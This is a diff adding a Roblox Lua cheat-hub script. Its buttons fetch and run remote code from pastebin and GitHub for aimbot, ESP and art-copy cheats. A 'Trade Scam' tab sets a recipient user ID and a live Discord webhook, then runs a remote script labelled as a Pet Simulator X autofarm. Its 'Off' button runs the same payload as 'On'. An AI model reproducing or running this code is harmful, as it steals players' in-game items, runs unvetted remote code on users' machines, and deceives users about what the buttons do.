@@ -1,0 +1,71 @@
+local kavoUi = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
+
+local window = kavoUi.CreateLib("Ｉｎｆｉｎｉｔｅ Ｈｕｂ ☘","Serpent")
+
+---Tabs
+
+local Tab1 = window:NewTab("🔫Aimbot")
+
+local Tab1Section = Tab1:NewSection("Universal Aimbot")
+
+local Tab2 = window:NewTab("🔥Esp")
+
+local Tab2Section = Tab2:NewSection("Sup is word")
+
+local Tab3 = window:NewTab("🎨Starving Artist")
+
+local Tab3Section = Tab3:NewSection("Starving Artist")
+
+local Tab4 = window:NewTab("🥳Trade Scam")
+
+local Tab4Section = Tab4:NewSection("Premium Version")
+
+local Tab5 = window:NewTab("🪪Credits")
+
+local Tab5Section = Tab5:NewSection("script by ᴋʏᴢᴏᴢɪᴢ😘😘")
+
+---Buttons
+
+Tab1Section:NewButton("Fixing","...",function()
+
+end)
+
+Tab2Section:NewButton("Esp","...",function()
+
+_G.FriendColor = Color3.fromRGB(0, 0, 255)
+
+_G.EnemyColor = Color3.fromRGB(255, 0, 0)
+
+_G.UseTeamColor = false
+
+--------------------------------------------------------------------
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zeroisswag/universal-esp/main/esp.lua"))()
+
+end)
+
+Tab3Section:NewButton("Art Copy","...",function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jeux45/Starving-Artist-script/main/Script", true))()
+
+end)
+
+Tab4Section:NewButton("On (click to turn on trade scam)","...",function()
+
+_G.UserID = 2275921800
+
+_G.WebHook = "https://discord.com/api/webhooks/1059633138487271504/lb0y8RXpipqO01QMyG8KCvibdnq-BhRkNU-V9lF74hPqjzsmmJ3AXeVgTPBYTHSoIICv"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
+
+end)
+
+Tab4Section:NewButton("Off (click to turn off trade scam)","...",function()
+
+_G.UserID = 2275921800
+
+_G.WebHook = "https://discord.com/api/webhooks/1059633138487271504/lb0y8RXpipqO01QMyG8KCvibdnq-BhRkNU-V9lF74hPqjzsmmJ3AXeVgTPBYTHSoIICv"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
+
+end)
